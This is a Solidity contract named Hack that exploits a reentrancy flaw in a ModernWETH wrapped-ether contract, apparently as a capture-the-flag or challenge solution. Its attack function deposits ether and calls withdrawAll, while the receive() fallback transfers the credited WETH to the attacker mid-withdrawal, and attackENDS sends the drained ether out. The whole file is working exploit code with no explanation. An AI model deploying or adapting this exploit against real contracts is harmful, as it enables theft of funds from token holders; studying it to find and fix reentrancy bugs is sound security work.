// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import{ModernWETH} from"./ModernWETH.sol";
contract Hack{
    address public hacker;
    uint256 public hackAmount= 10 ether;
    ModernWETH public weth;
    constructor(address _wethAddress) payable{
      hacker=msg.sender;  
      weth=ModernWETH(_wethAddress);
    }

 
    function attack() external{
        weth.deposit{value:hackAmount}();
        weth.withdrawAll();        
    }
    function attackENDS()external{
        (bool success,)=hacker.call{value:address(this).balance}("");
        require(success,"hack failed!");
    }
    receive() external payable{
    
    weth.transfer(hacker,hackAmount);
    }
}